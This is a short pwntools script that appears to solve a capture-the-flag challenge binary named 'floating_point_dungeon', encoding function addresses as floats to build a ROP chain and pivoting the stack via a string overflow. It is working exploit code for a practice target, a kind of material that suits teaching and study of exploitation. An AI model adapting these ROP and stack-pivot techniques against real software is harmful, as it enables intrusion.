#!/usr/bin/python

from pwn import *
import ctypes, struct

context.terminal = ['termite', '-e']
context.log_level = 'debug'
binary = context.binary = ELF('floating_point_dungeon')
p = process(binary.path)


def floatify(val):
    length = 1 if val <= 0xffffffff else 2
    a = ctypes.c_int32(val)
    return struct.unpack(ctypes.c_float._type_*length, struct.pack(a._type_, a.value))[0]


def defloatify(val):
    a = ctypes.c_float(val)
    return struct.unpack(ctypes.c_int32._type_, struct.pack(a._type_, a.value))[0]


def send_payload(payload):
    for fl in payload:
        p.sendafter(b' (menu)> ', b'1\n')
        p.sendafter(b' (floats)> ', b'%s\n' % str(fl).encode())

r = ROP(binary)
payload = []
a = payload.append
# a(0.0)  # placeholder for rbp
pad_length = 0
for _ in range(pad_length):
    a(0.0)
a(0.0)
a(floatify(binary.sym['number3']))
a(0.0)
a(floatify(binary.sym['set_key1']))
a(0.0)
a(floatify(binary.sym['ahhhhhhhh']))
a(0.0)
a(floatify(binary.sym['number3']))
a(0.0)
a(floatify(binary.sym['food']))
a(0.0)
a(floatify(binary.sym['win']))
a(0.0)

#payload[0] = floatify(binary.sym['FLOAT_HOARD'] + int((len(payload)/2)*8))

send_payload(payload)
p.sendafter(b' (menu)> ', b'2\n')
gdb.attach(p, """b *win+22\nb _dl_fixup\nc""")
p.sendafter(b' (string)> ', b'A'*8 + p64(binary.sym['FLOAT_HOARD']-8))

#print(p.recvuntil(b'}').decode())
# p.sendline(b"A"*0x32 + p64(binary.sym['FLOAT_HOARD']))

